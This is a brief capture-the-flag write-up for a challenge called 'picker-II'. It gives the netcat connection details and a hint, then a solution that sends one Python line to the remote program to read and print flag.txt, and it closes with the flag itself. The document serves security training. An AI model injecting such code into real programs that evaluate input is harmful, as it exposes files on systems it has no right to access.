## Descripción
Can you figure out how this program works to get the flag? Connect to the program with netcat:

`$ nc chatelaine.cylabacademy.net 21543`

The program's source code can be downloaded [here](https://challenge-files.cylabacademy.net/library/92a680c234b3626f3ee6907cb93b1aad46a7669063c9ea02fae2e07901d24ad8/picker-II.py).

Instance

Expires in 14:53

Hints

1

Can you do what `win` does with your input to the program?
## Solución
```
Dark23-academy@webshell:~$ nc chatelaine.cylabacademy.net 21543
==> print(open('flag.txt', 'r').read())
academy{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_c9aa7a3c}
```
## Notas Adicionales
## Referencias
https://challenge-files.cylabacademy.net/library/92a680c234b3626f3ee6907cb93b1aad46a7669063c9ea02fae2e07901d24ad8/picker-II.py